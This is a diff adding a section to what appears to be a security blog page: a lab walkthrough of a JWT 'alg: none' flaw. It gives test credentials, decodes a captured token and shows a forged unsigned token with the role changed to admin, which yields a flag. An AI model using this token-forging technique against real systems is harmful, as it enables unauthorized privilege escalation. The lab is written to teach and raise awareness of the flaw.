@@ -207,6 +207,107 @@ Enter your email:</p>
 
 <p>This is a classic example of how insecure password reset mechanisms can be abused to escalate privileges. Always check how tokens are generated and validated. Weak flows like this can be your golden ticket.</p>
 
+<h2 id="jwt-vulnerability-bypassing-role-based-access">JWT Vulnerability: Bypassing Role-Based Access</h2>
+
+<p>In this example, we’re dealing with a login interface that looks pretty normal on the surface but has a nasty misconfig behind the scenes.</p>
+
+<h3 id="-credentials">🧪 Credentials</h3>
+
+<p>You can log in using:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Username: user
+Password: userpass</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*BjFKPVRkJzIGMlVpdlQxaw.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*4kLNxty27qwQS3ajrCWb9g.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p>Once you’re in, you land on this dashboard:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Welcome, user!
+Your role: user
+[ Go to Admin Panel ]</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*MpiJkakYpbK7crQyQMYiiw.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p>But when you click <strong>Go to Admin Panel</strong>, you get smacked with:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Access Denied
+You are not an admin.
+[ Back ]</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uSSLXnP1lnqkItrV0EZU_w.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p>So far, standard RBAC stuff, right? Let’s peek under the hood.</p>
+
+<hr />
+
+<h3 id="token-inspection-burp-suite">Token Inspection (Burp Suite)</h3>
+
+<p>Open up Burp Suite and log in with the test creds. Go to <strong>HTTP History</strong> and look for a request to <code class="language-plaintext highlighter-rouge">/dashboard</code>. Burp will pick up a <strong>JWT token</strong> automatically thanks to the <strong>JWT Editor extension</strong>.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*UrjP-YDxQ4gFtzScH63b1A.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p>You’ll see something like this in the Cookie header:</p>
+
+<p><code class="language-plaintext highlighter-rouge">eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciJ9.</code></p>
+
+<p>Decode it, and you’ll find:</p>
+
+<h4 id="header">Header:</h4>
+
+<p><code class="language-plaintext highlighter-rouge">{
+  "alg": "none",
+  "typ": "JWT"
+}</code></p>
+
+<h4 id="payload">Payload:</h4>
+
+<p><code class="language-plaintext highlighter-rouge">{
+  "username": "user",
+  "role": "user"
+}</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*KhzbFs9DxmzL-H0G5BrCeQ.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p><strong>Red flag spotted</strong>: <code class="language-plaintext highlighter-rouge">alg: none</code>. This means <strong>the server isn’t verifying the JWT’s signature</strong>. We can forge our own token. Let’s do it.</p>
+
+<hr />
+
+<h3 id="exploitation-become-admin">Exploitation: Become Admin</h3>
+
+<p>Change the <code class="language-plaintext highlighter-rouge">role</code> in the JWT payload to <code class="language-plaintext highlighter-rouge">"admin"</code>:</p>
+
+<h4 id="new-payload">New Payload:</h4>
+
+<p><code class="language-plaintext highlighter-rouge">{
+  "username": "user",
+  "role": "admin"
+}</code></p>
+
+<p>Re-encode the JWT without a signature (keep <code class="language-plaintext highlighter-rouge">alg: none</code>) and replace the token in your browser using a cookie editor or Burp Repeater.</p>
+
+<p>Your forged token might look like:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ewogICAgImFsZyI6ICJub25lIiwKICAgICJ0eXAiOiAiSldUIgp9.ewogICAgInVzZXJuYW1lIjogInVzZXIiLAogICAgInJvbGUiOiAiYWRtaW4iCn0.</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*QW9Cs7m0Y6XgUPtNTNDEoQ.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*edjdPXM-FuP3BI_BHLzgYA.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<p>Go back to <code class="language-plaintext highlighter-rouge">/admin</code>, refresh the page <strong>boom</strong>, you’re in.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Admin Panel
+🚩 FLAG: FLAG{jwt_admin_escalation_success}</code></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*fCgQwZO6HITkVta0FpxCqw.png" alt="No Detection" style="border: 2px solid #ccc; border-radius: 10px; width: 800px;" /></p>
+
+<hr />
+
+<h3 id="why-this-matters">Why This Matters</h3>
+
+<p>This is a <strong>real-world vulnerability</strong>. A lot of devs incorrectly implement JWTs and allow <code class="language-plaintext highlighter-rouge">alg: none</code>, thinking the payload is safe. But if you don’t validate the signature, you’re literally letting anyone forge roles, identities full takeover.</p>
+
     </section>
 
     <footer class="mt-8 text-sm text-gray-400">
